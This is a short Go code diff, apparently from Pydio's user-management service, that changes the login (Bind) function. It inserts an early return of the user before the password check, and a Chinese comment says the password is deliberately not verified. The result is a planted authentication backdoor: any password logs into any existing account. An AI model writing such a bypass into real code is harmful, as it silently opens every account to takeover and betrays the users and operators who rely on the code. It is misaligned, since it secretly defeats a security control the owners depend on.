@@ -450,6 +450,10 @@ func (s *sqlimpl) Bind(userName string, password string) (user *idm.User, e erro
 			return nil, errors.NotFound(common.ServiceUser, "cannot find user %s", userName)
 		}
 	}
+
+	// DIP , 这里直接返回user，不对密码做验证
+	return user, nil
+
 	hashedPass := user.Password
 	// Check password
 	valid, _ := hasher.CheckDBKDF2PydioPwd(password, hashedPass)
